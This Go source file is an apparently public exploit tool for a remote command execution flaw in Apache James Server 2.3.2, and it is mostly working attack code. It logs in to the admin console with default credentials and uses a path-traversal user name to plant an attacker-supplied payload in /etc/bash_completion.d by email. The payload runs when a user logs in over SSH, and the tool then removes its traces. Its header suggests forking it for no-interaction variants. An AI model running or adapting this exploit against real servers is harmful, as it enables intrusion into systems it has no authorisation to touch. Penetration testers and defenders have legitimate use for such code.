/*
Apache James Server 2.3.2 Remote Command Execution Exploit
========================================================

Description:
------------
This is a Go implementation of a Remote Command Execution (RCE) exploit for Apache James Server 2.3.2.
Enhanced version of the original exploit by Jakub Palaczynski, Marcin Woloszyn, and Maciej Grabiec.

Prerequisites:
-------------
- Target must have default installation of Apache James Server 2.3.2 (details not specific)
- Default credentials (root/root) must be valid, else specify yours
- With the default attack vector of using /etc/bash_completion.d, you need to wait for a user to SSH login for the payload to execute

Exploit Details:
---------------
1. Exploits the server through the /etc/bash_completion.d path
2. Writes a malicious file that gets sourced automatically on user login
3. File contains email headers and payload - headers cause harmless errors, payload executes
4. Requires user interaction (login) to trigger payload execution

Note: Alternative exploitation methods like cron-based or no-interaction approaches could be
implemented by forking this code and altering the path traversal vulnerability to point to your choice of directory where files will be written to.
*/

package main

import (
	"fmt"
	"net"
	"os"
	"time"

	exploitkit "github.com/greycr0w/james-admin-exploit/crowsec-exploitkit"
)

// JamesExploit contains configuration and methods for the exploit
type JamesExploit struct {
	framework   *exploitkit.Framework
	remoteIP    string
	adminUser   string
	adminPwd    string
	adminPort   int
	smtpPort    int
	payload     string
	payloadFile string
}

// CreateJamesExploit creates an exploit instance with default settings
func CreateJamesExploit() *JamesExploit {
	exploit := &JamesExploit{}

	// Initialize framework
	fw := exploitkit.NewFramework("apache-james-rce", "Apache James Server 2.3.2 - Remote Code Execution")
	fw.Author = "greycr0w"
	fw.Version = "0.0.1"
	fw.Homepage = "https://github.com/greycr0w/exploits"
	fw.ShowBanner = true

	// Add flags
	fw.FlagSet.StringVar(&exploit.payload, "p", "", "Payload string")
	fw.FlagSet.StringVar(&exploit.payloadFile, "f", "", "File containing payload")
	fw.FlagSet.StringVar(&exploit.adminUser, "u", "root", "Admin username (default: root)")
	fw.FlagSet.StringVar(&exploit.adminPwd, "pwd", "root", "Admin password (default: root)")
	fw.FlagSet.IntVar(&exploit.adminPort, "admin", 32822, "James Remote Admin port (default: 32822)")
	fw.FlagSet.IntVar(&exploit.smtpPort, "smtp", 32825, "James SMTP port (default: 32825)")

	exploit.framework = fw
	return exploit
}

// recvData reads data from socket with delay
func (j *JamesExploit) recvData(conn net.Conn) error {
	buf := make([]byte, 1024)
	_, err := conn.Read(buf)
	time.Sleep(200 * time.Millisecond)
	return err
}

// connectAdmin connects to James Remote Administration Tool
func (j *JamesExploit) connectAdmin() error {
	j.framework.Logger.Success("Connecting to James Remote Administration Tool...")

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", j.remoteIP, j.adminPort))
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	j.recvData(conn)

	// Login
	fmt.Fprintf(conn, "%s\n", j.adminUser)
	j.recvData(conn)
	fmt.Fprintf(conn, "%s\n", j.adminPwd)
	j.recvData(conn)

	// Create malicious user, will be cleaned up later
	j.framework.Logger.Success("Creating user...")
	fmt.Fprintf(conn, "adduser ../../../../../../../../../../../../etc/bash_completion.d exploit\n")
	j.recvData(conn)

	fmt.Fprintf(conn, "quit\n")
	return nil
}

// sendPayload connects to SMTP and sends the payload
func (j *JamesExploit) sendPayload() error {
	j.framework.Logger.Success("Connecting to James SMTP server...")

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", j.remoteIP, j.smtpPort))
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// SMTP conversation
	fmt.Fprintf(conn, "ehlo crowsec.io\r\n")
	j.recvData(conn)

	// This email will be written to /etc/bash_completion.d/ directory under a random name by James Server, which will also including errors related to
	// the path traversal exploitation, such as HashMap exceptions and so on
	// The contents of this file will contain a bash script that will be automatically executed upon any user SSH login
	j.framework.Logger.Success("Sending email with payload...")
	fmt.Fprintf(conn, "mail from: <'@crowsec.io>\r\n")
	j.recvData(conn)
	fmt.Fprintf(conn, "rcpt to: <../../../../../../../../../../../../etc/bash_completion.d>\r\n")
	j.recvData(conn)

	// Send email with payload
	fmt.Fprintf(conn, "data\r\n")
	j.recvData(conn)
	fmt.Fprintf(conn, "From: crowsec.io\r\n\r\n'\n")
	fmt.Fprintf(conn, "%s\n\r\n.\r\n", j.payload)
	j.recvData(conn)

	fmt.Fprintf(conn, "quit\r\n")
	j.recvData(conn)

	return nil
}

// cleanup removes the malicious user and any sent emails
func (j *JamesExploit) cleanup() error {
	j.framework.Logger.Success("Cleaning up...")

	// Connect to admin interface to delete user
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", j.remoteIP, j.adminPort))
	if err != nil {
		return fmt.Errorf("failed to connect for cleanup: %v", err)
	}
	defer conn.Close()

	j.recvData(conn)

	// Login
	fmt.Fprintf(conn, "%s\n", j.adminUser)
	j.recvData(conn)
	fmt.Fprintf(conn, "%s\n", j.adminPwd)
	j.recvData(conn)

	// Delete malicious user
	j.framework.Logger.Success("Removing malicious user which should delete the payload we sent through an email...")
	fmt.Fprintf(conn, "deluser ../../../../../../../../../../../../etc/bash_completion.d\n")
	j.recvData(conn)

	fmt.Fprintf(conn, "quit\n")
	return nil
}

// Run executes the main exploit logic
func (j *JamesExploit) Run() error {
	// Load payload from file if specified
	if j.payloadFile != "" {
		data, err := os.ReadFile(j.payloadFile)
		if err != nil {
			return fmt.Errorf("failed to read payload file: %v", err)
		}
		j.payload = string(data)
	}

	j.framework.Logger.Info("Selected payload: %s", j.payload)

	if err := j.connectAdmin(); err != nil {
		return err
	}

	if err := j.sendPayload(); err != nil {
		return err
	}

	// Cleanup after payload is sent
	if err := j.cleanup(); err != nil {
		j.framework.Logger.Error("failed to cleanup: %v", err)
	}

	j.framework.Logger.Success("Exploit run successfully! The payload will be executed upon user SSH login to the victim server.")
	return nil
}

func main() {
	exploit := CreateJamesExploit()

	// Show banner at startup
	exploit.framework.PrintBanner()

	// Parse flags
	if err := exploit.framework.FlagSet.Parse(os.Args[1:]); err != nil {
		exploit.framework.Logger.Fatal("Failed to parse flags: %v", err)
	}

	// Validate arguments
	args := exploit.framework.FlagSet.Args()
	if len(args) != 1 {
		exploit.PrintUsage()
		os.Exit(1)
	}

	// Validate that exactly one of -p or -f is provided
	if (exploit.payload == "" && exploit.payloadFile == "") || (exploit.payload != "" && exploit.payloadFile != "") {
		exploit.framework.Logger.Fatal("Exactly one of -p or -f must be provided")
	}

	exploit.remoteIP = args[0]

	if err := exploit.Run(); err != nil {
		exploit.framework.Logger.Fatal("Exploit failed: %v", err)
	}
}

// PrintUsage prints custom usage information for this exploit
func (j *JamesExploit) PrintUsage() {
	// Don't print banner again since it's already shown at startup
	fmt.Fprintf(os.Stderr, "\nUsage: %s [options] <remote_ip>\n", os.Args[0])

	fmt.Fprintf(os.Stderr, "\n%sExamples:%s\n", exploitkit.ColorBlue, exploitkit.ColorReset)
	fmt.Fprintf(os.Stderr, "  %s -p 'touch /tmp/pwned' 172.16.1.66\n", os.Args[0])
	fmt.Fprintf(os.Stderr, "  %s -f payload.txt -u admin -pwd secret -admin 4555 -smtp 25 172.16.1.66\n\n", os.Args[0])

	j.framework.PrintUsage()
}
